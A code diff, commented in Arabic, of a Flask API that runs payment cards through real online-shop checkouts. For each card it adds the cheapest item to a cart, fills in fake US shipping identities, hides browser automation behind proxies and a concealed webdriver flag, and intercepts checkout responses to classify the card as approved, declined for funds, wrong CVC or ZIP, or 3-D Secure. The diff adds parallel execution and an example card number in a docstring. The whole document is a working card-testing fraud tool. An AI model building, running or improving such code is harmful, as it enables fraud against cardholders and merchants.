@@ -23,14 +23,17 @@ usser=generate_user_agent()
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
-MAX_WORKERS = 10
+MAX_WORKERS = 10  # عدد الطلبات المتوازية اللي تشتغل بنفس الوقت
 REQUEST_TIMEOUT = 60
 TASK_QUEUE = queue.Queue()
+
+# منفذ العمليات المتوازية - هذا اللي يخلي الطلبات تشتغل بنفس الوقت
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# عداد لتتبع الطلبات النشطة
 active_tasks = {}
 active_tasks_lock = threading.Lock()
 
@@ -139,51 +142,21 @@ MATCHED_ADDRESSES = [
 ]
 
 def generate_matched_shipping_data():
+    """
+    توليد بيانات شحن أمريكية متطابقة بالكامل
+    """
     address = random.choice(MATCHED_ADDRESSES).copy()
     username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
     address["email"] = f"{username}@{address['email_domain']}"
     return address
 
-def is_ignored_response(body, code, typename):
-    """
-    دالة موحدة للتحقق مما إذا كان يجب تجاهل الاستجابة
-    ترجع True إذا كان يجب تجاهلها
-    """
-    ignored_codes = [
-        'NegotiationResultPayload',
-        'Proposal'
-    ]
-    
-    ignored_typenames = [
-        'NegotiationResultPayload',
-        'Proposal',
-        'Query',
-        'Mutation',
-        'Subscription'
-    ]
-    
-    # فحص النص الكامل
-    if body and ('NegotiationResultPayload' in body or 'Proposal' in body):
-        # إذا كان يحتوي على NegotiationResultPayload أو Proposal فقط بدون كود مفيد آخر
-        if '"code":' not in body or '"code":"NegotiationResultPayload"' in body or '"code":"Proposal"' in body:
-            return True
-    
-    # فحص الكود
-    if code and code in ignored_codes:
-        return True
-    
-    # فحص typename
-    if typename and typename in ignored_typenames:
-        return True
-    
-    return False
-
 def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
+    """
+    طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
+    """
+    
     valid_codes = []
     for code in all_codes:
-        # تجاهل NegotiationResultPayload
-        if code == 'NegotiationResultPayload' or code == 'Proposal':
-            continue
         is_excluded = False
         for excluded in excluded_codes:
             if excluded in code:
@@ -215,7 +188,7 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
         return filtered_underscore_codes[0], None
     
     if all_typenames:
-        typename_underscore = [t for t in all_typenames if '_' in t and t not in ['NegotiationResultPayload', 'Proposal', 'Query', 'Mutation', 'Subscription']]
+        typename_underscore = [t for t in all_typenames if '_' in t]
         filtered_typename_underscore = []
         for t in typename_underscore:
             is_unwanted = False
@@ -233,13 +206,21 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
         return valid_codes[0], None
     
     if all_typenames:
-        valid_typenames = [t for t in all_typenames if t not in ['NegotiationResultPayload', 'Proposal', 'Query', 'Mutation', 'Subscription']]
-        if valid_typenames:
-            return valid_typenames[0], valid_typenames[0]
+        return all_typenames[0], all_typenames[0]
     
     return None, None
 
 def ff(ccx, site, task_id=None):
+    """
+    دالة معالجة بطاقة واحدة وموقع واحد
+    تعمل بشكل مستقل تماماً - كل استدعاء له متصفحه الخاص
+    
+    ccx: رقم البطاقة|الشهر|السنة|cvv
+    site: رابط الموقع
+    task_id: معرف المهمة للتتبع
+    """
+    
+    # تسجيل بدء المهمة
     if task_id:
         with active_tasks_lock:
             active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
@@ -321,50 +302,16 @@ def ff(ccx, site, task_id=None):
         if not shippable_products:
             return {"success": False, "code": None, "error": "No shippable product", "task_id": task_id}
         
-        selected_product = random.choice(shippable_products)
-        variant_id = selected_product['variant_id']
-        total_amount = f"${selected_product['price']:.2f}"
+        cheapest = min(shippable_products, key=lambda x: x['price'])
+        variant_id = cheapest['variant_id']
+        total_amount = f"${cheapest['price']:.2f}"
         
-        # ===== محاولة الإضافة إلى السلة مع إعادة المحاولة =====
-        max_retries = 5
-        cart_added = False
-        for retry_attempt in range(max_retries):
-            try:
-                resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, timeout=100)
-                if resp.status_code == 200:
-                    cart_added = True
-                    logger.info(f"[{task_id}] Cart add successful on attempt {retry_attempt + 1}")
-                    break
-                else:
-                    logger.warning(f"[{task_id}] Cart add failed (attempt {retry_attempt + 1}/{max_retries}), status: {resp.status_code}")
-                    time.sleep(1.5 * (retry_attempt + 1))
-            except Exception as e:
-                logger.warning(f"[{task_id}] Cart add exception (attempt {retry_attempt + 1}/{max_retries}): {str(e)}")
-                time.sleep(1.5 * (retry_attempt + 1))
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies,  timeout=100)
+        if resp.status_code != 200:
+            return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
         
-        if not cart_added:
-            return {"success": False, "code": None, "error": f"Failed to add to cart after {max_retries} attempts", "task_id": task_id}
-        
-        # ===== محاولة الانتقال إلى checkout مع إعادة المحاولة =====
-        checkout_retries = 3
-        checkout_success = False
-        for checkout_attempt in range(checkout_retries):
-            try:
-                response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, timeout=100)
-                if response.status_code == 200 or response.url != f'{site}/cart':
-                    checkout_url = response.url
-                    checkout_success = True
-                    logger.info(f"[{task_id}] Checkout URL obtained on attempt {checkout_attempt + 1}")
-                    break
-                else:
-                    logger.warning(f"[{task_id}] Checkout redirect failed (attempt {checkout_attempt + 1}/{checkout_retries})")
-                    time.sleep(2)
-            except Exception as e:
-                logger.warning(f"[{task_id}] Checkout exception (attempt {checkout_attempt + 1}/{checkout_retries}): {str(e)}")
-                time.sleep(2)
-        
-        if not checkout_success or not checkout_url:
-            return {"success": False, "code": None, "error": "Failed to get checkout URL", "task_id": task_id}
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies,timeout=100)
+        checkout_url = response.url
         
     except Exception as e:
         return {"success": False, "code": None, "error": str(e), "task_id": task_id}
@@ -388,7 +335,7 @@ def ff(ccx, site, task_id=None):
         
         driver = webdriver.Chrome(options=chrome_options)
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        wait = WebDriverWait(driver, 15)
+        wait = WebDriverWait(driver, 5)
         driver.set_page_load_timeout(25)
         
         driver.get(checkout_url)
@@ -533,24 +480,13 @@ def ff(ccx, site, task_id=None):
         except:
             return {"success": False, "code": None, "error": "Payment error", "task_id": task_id}
         
-        # ==================== 5. اعتراض GraphQL - فلترة شاملة ====================
+        # ==================== 5. اعتراض GraphQL ====================
         try:
             script = """
-            window.pollForReceiptResponses = [];
             window.graphqlResponses = [];
             window.allResponses = [];
+            window.pollForReceiptResponses = [];
             window.pageUrls = [];
-            
-            function isIgnoredResponse(text) {
-                if (!text) return false;
-                // تجاهل إذا كان NegotiationResultPayload هو الكود الوحيد
-                if (text.includes('"__typename":"NegotiationResultPayload"') || text.includes('"__typename": "NegotiationResultPayload"')) {
-                    if (!text.includes('"code":"') || text.includes('"code":"NegotiationResultPayload"') || text.includes('"code": "NegotiationResultPayload"')) {
-                        return true;
-                    }
-                }
-                return false;
-            }
             
             var originalFetch = window.fetch;
             window.fetch = function(url, options) {
@@ -580,11 +516,6 @@ def ff(ccx, site, task_id=None):
                         
                         if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
                             
-                            // تجاهل Proposal و NegotiationResultPayload
-                            if (isIgnoredResponse(text)) {
-                                return;
-                            }
-                            
                             var isProposal = false;
                             if (requestBody) {
                                 try {
@@ -595,19 +526,17 @@ def ff(ccx, site, task_id=None):
                                 } catch(e) {}
                             }
                             
-                            if (isProposal) {
-                                return;
-                            }
-                            
-                            window.graphqlResponses.push(data);
-                            
-                            if (requestBody) {
-                                try {
-                                    var parsedBody2 = JSON.parse(requestBody);
-                                    if (parsedBody2.operationName === 'PollForReceipt') {
-                                        window.pollForReceiptResponses.push(data);
-                                    }
-                                } catch(e) {}
+                            if (!isProposal) {
+                                window.graphqlResponses.push(data);
+                                
+                                if (requestBody) {
+                                    try {
+                                        var parsedBody2 = JSON.parse(requestBody);
+                                        if (parsedBody2.operationName === 'PollForReceipt') {
+                                            window.pollForReceiptResponses.push(data);
+                                        }
+                                    } catch(e) {}
+                                }
                             }
                         }
                     });
@@ -644,10 +573,6 @@ def ff(ccx, site, task_id=None):
                         
                         if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
                             
-                            if (isIgnoredResponse(text)) {
-                                return;
-                            }
-                            
                             var isProposal = false;
                             if (requestBody) {
                                 try {
@@ -658,19 +583,17 @@ def ff(ccx, site, task_id=None):
                                 } catch(e) {}
                             }
                             
-                            if (isProposal) {
-                                return;
-                            }
-                            
-                            window.graphqlResponses.push(data);
-                            
-                            if (requestBody) {
-                                try {
-                                    var parsedBody2 = JSON.parse(requestBody);
-                                    if (parsedBody2.operationName === 'PollForReceipt') {
-                                        window.pollForReceiptResponses.push(data);
-                                    }
-                                } catch(e) {}
+                            if (!isProposal) {
+                                window.graphqlResponses.push(data);
+                                
+                                if (requestBody) {
+                                    try {
+                                        var parsedBody2 = JSON.parse(requestBody);
+                                        if (parsedBody2.operationName === 'PollForReceipt') {
+                                            window.pollForReceiptResponses.push(data);
+                                        }
+                                    } catch(e) {}
+                                }
                             }
                         }
                     } catch(e) {}
@@ -752,18 +675,18 @@ def ff(ccx, site, task_id=None):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-                'Economy',
-                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'First', 
-                'by-items', 
-                'Standard', 
-                'Priority', 
-                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-                'GroundAdvantage', 
-                'MediaMail',
-                'AddressLocalizationKeys',
-                'NegotiationResultPayload',
-                'Proposal'
+             'Economy',
+             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'First', 
+            'by-items', 
+            'Standard', 
+            'Priority', 
+            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
+            'GroundAdvantage', 
+            'MediaMail',
+            'AddressLocalizationKeys'
+           
+             
             ]
             
             for attempt in range(10):
@@ -818,7 +741,6 @@ def ff(ccx, site, task_id=None):
                 except:
                     pass
                 
-                # معالجة PollForReceipt responses
                 for resp in poll_responses:
                     body = resp.get('body', '')
                     url = resp.get('url', '')
@@ -826,16 +748,10 @@ def ff(ccx, site, task_id=None):
                     if not body:
                         continue
                     
-                    # استخدام دالة is_ignored_response للفلترة
-                    if is_ignored_response(body, None, None):
-                        continue
-                    
                     pattern = r'"code"\s*:\s*"([^"]+)"'
                     matches = re.findall(pattern, body, re.IGNORECASE)
                     for code in matches:
                         if len(code) > 3 and len(code) < 80 and ' ' not in code:
-                            if is_ignored_response(None, code, None):
-                                continue
                             is_excluded = False
                             for excluded in excluded_codes:
                                 if excluded in code:
@@ -849,7 +765,7 @@ def ff(ccx, site, task_id=None):
                         matches = re.findall(pattern, body, re.IGNORECASE)
                         for typename in matches:
                             if len(typename) > 3 and len(typename) < 80:
-                                if not is_ignored_response(None, None, typename):
+                                if typename not in ['Query', 'Mutation', 'Subscription']:
                                     if typename not in all_typenames:
                                         all_typenames.append(typename)
                     
@@ -860,18 +776,16 @@ def ff(ccx, site, task_id=None):
                             if err:
                                 code = err.get('code')
                                 if code and len(code) > 3 and len(code) < 80:
-                                    if not is_ignored_response(None, code, None):
-                                        is_excluded = False
-                                        for excluded in excluded_codes:
-                                            if excluded in code:
-                                                is_excluded = True
-                                                break
-                                        if not is_excluded and code not in all_codes:
-                                            all_codes.append(code)
+                                    is_excluded = False
+                                    for excluded in excluded_codes:
+                                        if excluded in code:
+                                            is_excluded = True
+                                            break
+                                    if not is_excluded and code not in all_codes:
+                                        all_codes.append(code)
                                 typename = err.get('__typename')
-                                if typename and not is_ignored_response(None, None, typename):
-                                    if typename not in all_typenames:
-                                        all_typenames.append(typename)
+                                if typename and typename not in all_typenames:
+                                    all_typenames.append(typename)
                                 message = err.get('message', '')
                                 if message:
                                     response_result = message
@@ -886,25 +800,60 @@ def ff(ccx, site, task_id=None):
                                 if isinstance(error, dict):
                                     code = error.get('code')
                                     if code and len(code) > 3 and len(code) < 80:
-                                        if not is_ignored_response(None, code, None):
-                                            is_excluded = False
-                                            for excluded in excluded_codes:
-                                                if excluded in code:
-                                                    is_excluded = True
-                                                    break
-                                            if not is_excluded and code not in all_codes:
-                                                all_codes.append(code)
+                                        is_excluded = False
+                                        for excluded in excluded_codes:
+                                            if excluded in code:
+                                                is_excluded = True
+                                                break
+                                        if not is_excluded and code not in all_codes:
+                                            all_codes.append(code)
                                     typename = error.get('__typename')
-                                    if typename and not is_ignored_response(None, None, typename):
-                                        if typename not in all_typenames:
-                                            all_typenames.append(typename)
+                                    if typename and typename not in all_typenames:
+                                        all_typenames.append(typename)
                                     message = error.get('message', '')
                                     if message:
                                         response_result = message
                         except:
                             pass
+                
+                for resp in graphql_responses:
+                    body = resp.get('body', '')
+                    url = resp.get('url', '')
                     
-                    if 'CompletePaymentChallenge' in body:
+                    if not body:
+                        continue
+                    
+                    if '/thank_you' in body or 'thank_you' in url:
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        break
+                    
+                    if f"{base_url}/thank_you" in body or f"{base_url}/post_purchase" in body:
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        break
+                    
+                    if 'Your order is confirmed' in body or 'Order confirmed' in body or 'order confirmed' in body.lower():
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
+                        if order_match:
+                            order_number = order_match.group(1)
+                        break
+                    
+                    if 'Thank you for your order' in body or 'thank you for your order' in body.lower():
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
+                        if order_match:
+                            order_number = order_match.group(1)
+                        break
+                    
+                    if '/persisted' in url and 'CompletePaymentChallenge' in body:
                         try:
                             data = json.loads(body)
                             if 'data' in data and 'receipt' in data['data']:
@@ -919,74 +868,12 @@ def ff(ccx, site, task_id=None):
                                         break
                         except:
                             pass
-                
-                if found_code or order_confirmed:
-                    break
-                
-                # معالجة graphqlResponses كاحتياط
-                if not all_codes:
-                    for resp in graphql_responses:
-                        body = resp.get('body', '')
-                        url = resp.get('url', '')
-                        
-                        if not body:
-                            continue
-                        
-                        if is_ignored_response(body, None, None):
-                            continue
-                        
-                        if '/thank_you' in body or 'thank_you' in url:
-                            order_confirmed = True
-                            found_code = 'ORDER_CONFIRMED'
-                            response_result = 'Order confirmed - Thank you for your purchase!'
-                            break
-                        
-                        if f"{base_url}/thank_you" in body or f"{base_url}/post_purchase" in body:
-                            order_confirmed = True
-                            found_code = 'ORDER_CONFIRMED'
-                            response_result = 'Order confirmed - Thank you for your purchase!'
-                            break
-                        
-                        if 'Your order is confirmed' in body or 'Order confirmed' in body:
-                            order_confirmed = True
-                            found_code = 'ORDER_CONFIRMED'
-                            response_result = 'Order confirmed - Thank you for your purchase!'
-                            order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
-                            if order_match:
-                                order_number = order_match.group(1)
-                            break
-                        
-                        if 'Thank you for your order' in body:
-                            order_confirmed = True
-                            found_code = 'ORDER_CONFIRMED'
-                            response_result = 'Order confirmed - Thank you for your purchase!'
-                            order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
-                            if order_match:
-                                order_number = order_match.group(1)
-                            break
-                        
-                        if '/persisted' in url and 'CompletePaymentChallenge' in body:
-                            try:
-                                data = json.loads(body)
-                                if 'data' in data and 'receipt' in data['data']:
-                                    receipt = data['data']['receipt']
-                                    if 'action' in receipt:
-                                        action = receipt['action']
-                                        if action.get('__typename') == 'CompletePaymentChallenge':
-                                            is_3ds = True
-                                            found_code = '3DS_REQUIRED'
-                                            found_typename = 'CompletePaymentChallenge'
-                                            response_result = '3DS Secure required - Please complete authentication'
-                                            break
-                            except:
-                                pass
-                        
+                    
+                    if not all_codes:
                         pattern = r'"code"\s*:\s*"([^"]+)"'
                         matches = re.findall(pattern, body, re.IGNORECASE)
                         for code in matches:
                             if len(code) > 3 and len(code) < 80 and ' ' not in code:
-                                if is_ignored_response(None, code, None):
-                                    continue
                                 is_excluded = False
                                 for excluded in excluded_codes:
                                     if excluded in code:
@@ -994,47 +881,46 @@ def ff(ccx, site, task_id=None):
                                         break
                                 if not is_excluded and code not in all_codes:
                                     all_codes.append(code)
-                        
+                    
+                    if not all_typenames:
                         if '__typename' in body:
                             pattern = r'"__typename"\s*:\s*"([^"]+)"'
                             matches = re.findall(pattern, body, re.IGNORECASE)
                             for typename in matches:
                                 if len(typename) > 3 and len(typename) < 80:
-                                    if not is_ignored_response(None, None, typename):
+                                    if typename not in ['Query', 'Mutation', 'Subscription']:
                                         if typename not in all_typenames:
                                             all_typenames.append(typename)
-                        
-                        pattern = r'"status"\s*:\s*"([^"]+)"'
-                        matches = re.findall(pattern, body, re.IGNORECASE)
-                        for status in matches:
-                            if len(status) > 3 and len(status) < 80 and ' ' not in status:
-                                if is_ignored_response(None, status, None):
-                                    continue
-                                is_excluded = False
-                                for excluded in excluded_codes:
-                                    if excluded in status:
-                                        is_excluded = True
-                                        break
-                                if not is_excluded and status not in all_codes:
-                                    all_codes.append(status)
-                        
-                        if '/authentications/' in body or 'AUTHORIZATION_ERROR' in body:
-                            if '3DS_REQUIRED' not in all_codes:
-                                all_codes.append('3DS_REQUIRED')
-                                response_result = '3DS Secure required'
-                        
-                        if 'INCORRECT_ZIP' in body:
-                            if 'INCORRECT_ZIP' not in all_codes:
-                                all_codes.append('INCORRECT_ZIP')
-                                response_result = 'Incorrect ZIP'
-                        if 'INSUFFICIENT_FUNDS' in body:
-                            if 'INSUFFICIENT_FUNDS' not in all_codes:
-                                all_codes.append('INSUFFICIENT_FUNDS')
-                                response_result = 'Insufficient funds'
-                        if 'INCORRECT_CVC' in body:
-                            if 'INCORRECT_CVC' not in all_codes:
-                                all_codes.append('INCORRECT_CVC')
-                                response_result = 'INCORRECT_CVC'
+                    
+                    pattern = r'"status"\s*:\s*"([^"]+)"'
+                    matches = re.findall(pattern, body, re.IGNORECASE)
+                    for status in matches:
+                        if len(status) > 3 and len(status) < 80 and ' ' not in status:
+                            is_excluded = False
+                            for excluded in excluded_codes:
+                                if excluded in status:
+                                    is_excluded = True
+                                    break
+                            if not is_excluded and status not in all_codes:
+                                all_codes.append(status)
+                    
+                    if '/authentications/' in body or 'AUTHORIZATION_ERROR' in body:
+                        if '3DS_REQUIRED' not in all_codes:
+                            all_codes.append('3DS_REQUIRED')
+                            response_result = '3DS Secure required'
+                    
+                    if 'INCORRECT_ZIP' in body:
+                        if 'INCORRECT_ZIP' not in all_codes:
+                            all_codes.append('INCORRECT_ZIP')
+                            response_result = 'Incorrect ZIP'
+                    if 'INSUFFICIENT_FUNDS' in body:
+                        if 'INSUFFICIENT_FUNDS' not in all_codes:
+                            all_codes.append('INSUFFICIENT_FUNDS')
+                            response_result = 'Insufficient funds'
+                    if 'INCORRECT_CVC' in body:
+                        if 'INCORRECT_CVC' not in all_codes:
+                            all_codes.append('INCORRECT_CVC')
+                            response_result = 'INCORRECT_CVC'
                 
                 if found_code or order_confirmed:
                     break
@@ -1055,9 +941,6 @@ def ff(ccx, site, task_id=None):
                                         response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
                                         body = response.get('body', '')
                                         if body:
-                                            if is_ignored_response(body, None, None):
-                                                continue
-                                                
                                             if 'CompletePaymentChallenge' in body:
                                                 try:
                                                     data = json.loads(body)
@@ -1078,8 +961,6 @@ def ff(ccx, site, task_id=None):
                                                 matches = re.findall(pattern, body, re.IGNORECASE)
                                                 for code in matches:
                                                     if len(code) > 3 and len(code) < 80 and ' ' not in code:
-                                                        if is_ignored_response(None, code, None):
-                                                            continue
                                                         is_excluded = False
                                                         for excluded in excluded_codes:
                                                             if excluded in code:
@@ -1092,7 +973,7 @@ def ff(ccx, site, task_id=None):
                                                 matches = re.findall(pattern, body, re.IGNORECASE)
                                                 for typename in matches:
                                                     if len(typename) > 3 and len(typename) < 80:
-                                                        if not is_ignored_response(None, None, typename):
+                                                        if typename not in ['Query', 'Mutation', 'Subscription']:
                                                             if typename not in all_typenames:
                                                                 all_typenames.append(typename)
                                     except:
@@ -1108,12 +989,6 @@ def ff(ccx, site, task_id=None):
             if driver:
                 driver.quit()
             
-            # ==================== فلترة نهائية قبل النتيجة ====================
-            # تنظيف all_codes من NegotiationResultPayload
-            all_codes = [c for c in all_codes if c != 'NegotiationResultPayload' and c != 'Proposal']
-            # تنظيف all_typenames
-            all_typenames = [t for t in all_typenames if t not in ['NegotiationResultPayload', 'Proposal', 'Query', 'Mutation', 'Subscription']]
-            
             # ==================== نتيجة الاستخراج ====================
             if order_confirmed:
                 result_code = 'ORDER_CONFIRMED'
@@ -1128,7 +1003,7 @@ def ff(ccx, site, task_id=None):
             elif found_code == 'SUCCESS':
                 result_code = 'SUCCESS'
                 result_typename = found_typename
-            elif found_code and found_code not in excluded_codes and found_code != 'NegotiationResultPayload':
+            elif found_code and found_code not in excluded_codes:
                 result_code = found_code
                 result_typename = found_typename
             else:
@@ -1136,24 +1011,17 @@ def ff(ccx, site, task_id=None):
                     all_codes, all_typenames, excluded_codes
                 )
                 
-                if extracted_code and extracted_code != 'NegotiationResultPayload':
+                if extracted_code:
                     result_code = extracted_code
                     result_typename = extracted_typename if extracted_typename else found_typename
                 elif all_typenames:
                     result_code = all_typenames[0]
                     result_typename = all_typenames[0]
-                elif all_codes:
-                    result_code = all_codes[0]
-                    result_typename = None
                 else:
                     result_code = None
                     result_typename = None
             
-            # فلترة نهائية - إذا النتيجة NegotiationResultPayload نرجع None
-            if result_code == 'NegotiationResultPayload' or result_typename == 'NegotiationResultPayload':
-                result_code = None
-                result_typename = None
-            
+            # تحديث حالة المهمة
             if task_id:
                 with active_tasks_lock:
                     if task_id in active_tasks:
@@ -1232,6 +1100,15 @@ def ff(ccx, site, task_id=None):
 # ==================== Routes ====================
 @app.route('/', methods=['GET'])
 def home():
+    """
+    نقطة النهاية الرئيسية
+    
+    الاستخدام:
+    /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
+    
+    مثال:
+    /?cc=4918460118934875|08|2027|293&url=https://www.example.com
+    """
     cc = request.args.get('cc')
     url = request.args.get('url')
     
@@ -1242,7 +1119,10 @@ def home():
             "error": "Missing cc or url parameters. Use /?cc=CARD&url=SITE"
         })
     
+    # توليد معرف للمهمة
     task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
+    
+    # تنفيذ المهمة في Thread منفصل - هذا يسمح بتنفيذ عدة طلبات بنفس الوقت
     future = executor.submit(ff, cc, url, task_id)
     
     try:
@@ -1258,6 +1138,9 @@ def home():
 
 @app.route('/status', methods=['GET'])
 def status():
+    """
+    معرفة حالة جميع المهام النشطة
+    """
     with active_tasks_lock:
         return jsonify({
             "active_tasks_count": len(active_tasks),
@@ -1275,4 +1158,6 @@ def health():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
+    # تشغيل Flask مع دعم threads للتوازي
     app.run(host='0.0.0.0', port=port, threaded=True)
+
